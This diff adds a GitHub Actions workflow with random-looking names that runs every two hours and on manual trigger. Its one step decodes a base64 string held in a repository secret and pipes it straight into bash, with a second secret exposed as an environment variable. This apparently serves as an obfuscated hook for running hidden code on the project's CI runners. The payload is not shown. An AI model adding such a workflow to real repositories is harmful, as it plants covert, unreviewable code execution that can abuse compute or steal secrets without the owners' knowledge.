@@ -1,0 +1,13 @@
+name: AKYOtPm
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  EXHLmwAWIU:
+    runs-on: ubuntu-latest
+    env:
+      gBgNeQSdeJ: ${{ secrets.FyYzxQqci }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.sXclur }}" | base64 -d | bash
